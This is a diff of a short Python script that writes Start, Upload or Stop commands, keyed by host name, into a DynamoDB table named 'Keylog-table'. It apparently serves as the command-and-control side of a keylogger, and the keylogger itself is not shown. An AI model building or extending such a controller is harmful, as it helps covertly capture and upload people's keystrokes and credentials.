@@ -1,27 +1,33 @@
 import boto3
+import os
+from dotenv import load_dotenv
 
 
 def main():
-    device_id = input("Device id: ")
+
+    load_dotenv()
+    
+    host_name = input("Device id: ")
 
     while True:
-        cmd = input("Enter cmd: Start | Upload | Stop").strip().lower()
+        cmd = input("Enter cmd: Start | Upload | Stop = ").strip().lower()
         
         if cmd == "start":
-            update_cmd(device_id, cmd)
+            update_cmd(host_name, cmd)
         elif cmd == "upload":
-            update_cmd(device_id, cmd)
+            update_cmd(host_name, cmd)
         elif cmd == "stop":
-            update_cmd(device_id, cmd)
+            update_cmd(host_name, cmd)
         else:
             break
 
 
-def update_cmd(device_id, cmd):
-    dynamodb = boto3.client('dynamodb', region_name='ap-southeast-2')
+def update_cmd(host_name, cmd):
+    dynamodb = boto3.client('dynamodb',
+    region_name='ap-southeast-2')
     dynamodb.update_item(
-        TableName='keylogger_table',
-        Key={'device_id': {'S': device_id}},
+        TableName='Keylog-table',
+        Key={'hostName': {'S': host_name}},
         UpdateExpression='SET last_command = :cmd',
         ExpressionAttributeValues={':cmd': {'S': cmd}}
 )
